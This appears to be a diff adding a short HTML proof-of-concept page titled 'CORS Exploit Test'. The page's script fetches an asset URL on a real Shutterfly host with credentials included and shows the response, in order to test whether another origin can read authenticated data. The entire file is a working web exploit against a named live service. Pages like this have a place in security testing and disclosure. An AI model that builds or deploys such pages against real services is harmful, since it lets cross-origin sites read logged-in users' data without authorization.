@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>CORS Exploit Test</h1>
+    <pre id="output">Loading...</pre>
+
+    <script>
+      fetch("https://im1.shutterfly.com/services/svgasset/layoutId/1007634/layoutVersion/17/maskId/348/surface/1?childSkus=%7B%22COLOR%22%3A%22WHITEENVELOPE5X7%22%7D&layoutIntId=100762&isLandscape=true&brand=SFLY", {
+        credentials: "include"
+      })
+      .then(response => response.text())
+      .then(data => {
+        document.getElementById("output").innerText = data;
+      })
+      .catch(err => {
+        document.getElementById("output").innerText = "Error: " + err;
+      });
+    </script>
+  </body>
+</html>
